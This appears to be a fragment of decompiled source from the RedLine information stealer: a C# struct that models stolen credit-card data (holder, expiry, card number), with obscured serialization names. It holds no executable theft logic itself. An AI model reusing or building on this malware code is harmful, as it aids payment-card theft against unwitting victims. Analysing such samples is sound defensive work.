using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity11", Namespace = "Entity")]
[ProtoContract(Name = "CreditCard")]
public struct CreditCard
{
	[DataMember(Name = "Id1")]
	[ProtoMember(1, Name = "Holder")]
	public string Holder { get; set; }

	[DataMember(Name = "Id2")]
	[ProtoMember(2, Name = "ExpirationMonth")]
	public byte ExpirationMonth { get; set; }

	[ProtoMember(3, Name = "ExpirationYear")]
	[DataMember(Name = "Id3")]
	public short ExpirationYear { get; set; }

	[DataMember(Name = "Id4")]
	[ProtoMember(4, Name = "CardNumber")]
	public string CardNumber { get; set; }
}
